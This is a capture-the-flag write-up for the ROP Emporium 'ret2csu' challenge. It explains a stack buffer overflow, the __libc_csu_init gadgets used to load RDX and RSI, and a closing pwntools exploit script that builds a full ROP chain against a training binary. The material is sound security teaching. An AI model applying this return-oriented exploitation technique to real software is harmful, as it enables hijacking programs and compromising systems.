# ret2csu

Link : [ret2csu](https://ropemporium.com/challenge/ret2csu.html)

Binary : [ret2csu](https://github.com/w31rdr4v3n/Binary-Exploitation/blob/main/ROP/data/ropemporium/ret2csu.zip)


Here is the source code of the pwnme function in libret2csu.so

![pwnme](data/ropemporium/pwnme.png)

At ```read(0,local_28,0x200);``` there is a buffer overflow vulnerability.

ret2win function in libret2csu.so

![retwin](data/ropemporium/retwin.png)

In the function ret2win(), it is necessary that the first parameter is equal to 0xdeadbeefdeadbeef, the second is equal to 0xcafebabecafebabe and the third is equal to 0xd00df00dd00df00d .

The first parameter is RDI, the second RSI and the third RDX.

![ret2win_param](data/ropemporium/ret2win_param.png)

We need to modify these registers with the values 0xdeadbeefdeadbeef,0xcafebabecafebabe and 0xd00df00dd00df00d, and call the ret2win() function to get the flag.

To modify these registers, we need gadgets that allow us to move values in these registers, gadgets with the POP or MOV instruction for example.

But there is no gadget to modify the RDX register. To solve this problem, we will use ret_2_csu.

The __libc_csu_init function is responsible for initializing the libc file. Essentially we will be pulling ROP gadgets from this function.

![__libc_csu_init](data/ropemporium/__libc_csu_init.png)

We have:
```ASM
                             LAB_00400680                                    XREF[1]:     00400694 (j)   
        00400680 4c  89  fa       MOV        RDX ,R15
        00400683 4c  89  f6       MOV        RSI ,R14
        00400686 44  89  ef       MOV        EDI ,R13D
```

We will put our values in R15 and R14 and finally use these gadgets above.

We have here EDI a register of 4 bytes, while we need a register of 8 bytes for 0xdeadbeefdeadbeef 

We will use the gadget ```pop rdi; ret``` for that.

![pop rdi](data/ropemporium/poprdi.png)

There are these gadgets, we can use them to put our values in R15 and R14:

```ASM
        0040069a 5b              POP        RBX
        0040069b 5d              POP        RBP
        0040069c 41  5c           POP        R12
        0040069e 41  5d           POP        R13
        004006a0 41  5e           POP        R14
        004006a2 41  5f           POP        R15
        004006a4 c3              RET
```

Nevertheless we have a problem, we don't have a RET after ```MOV EDI, R13D``` which can make our ROP CHAIN fail.

To solve this problem, we will let our ROP CHAIN run until ```004006a4 c3 RET```.

Even with that, we have some challenges:

```ASM
        00400689 41  ff  14  dc    CALL       qword ptr [R12  + RBX *0x8 ]=>->frame_dummy        undefined frame_dummy()
                                                                                             = 4005D0h
                                                                                             = 400600h
                                                                                             undefined __do_global_dtors_aux()
        0040068d 48  83  c3  01    ADD        RBX ,0x1
        00400691 48  39  dd       CMP        RBP ,RBX
        00400694 75  ea           JNZ        LAB_00400680

```

There is a call to the address to which ```R12 + RBX *0x8``` points,
If we set RBX to 0 and put in R12 the address of a memory location containing the address of a function that will not clash, it will be ok.

I'll use the _init function.

Let's find the location containing this address, or the pointer to this address.

![_init](data/ropemporium/_init.png)

The pointer of the ```_init``` function is ```0x600e38```.

After this call, we also have ```CMP RBP ,RBX```

Here we just have to set RBP to 0x1 and RBX to 0x0 since there is an increment of RBX, ```ADD RBX ,0x1```

After that, we can call our ret2win function.

Exploit:

```python
from pwn import *

sh = process("./ret2csu")

print(sh.recv().decode())

payload = B"A"*(32+8)
payload += p64(0x40069a) # POP RBX ; POP RBP ; POP R12 ; POP R13 ; POP R14 ; POP R15 ; RET
payload += p64(0x0)
payload += p64(0x1)
payload += p64(0x600e38)
payload += p64(0x0)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)

payload += p64(0x400680) # first gadget with MOV
payload += p64(0x0) #  ADD RSP ,0x8
payload += p64(0x0) # POP RBX ;
payload += p64(0x0) # POP RBP ;
payload += p64(0x0) # POP R12 ;
payload += p64(0x0) # POP R13 ;
payload += p64(0x0) # POP R14 ;
payload += p64(0x0) # POP R15 ;

payload += p64(0x04006a3) # pop rdi ; ret
payload += p64(0xdeadbeefdeadbeef)

payload += p64(0x400510) # ret2win

sh.sendline(payload)
sh.interactive()
```

![flag](data/ropemporium/flag.png)
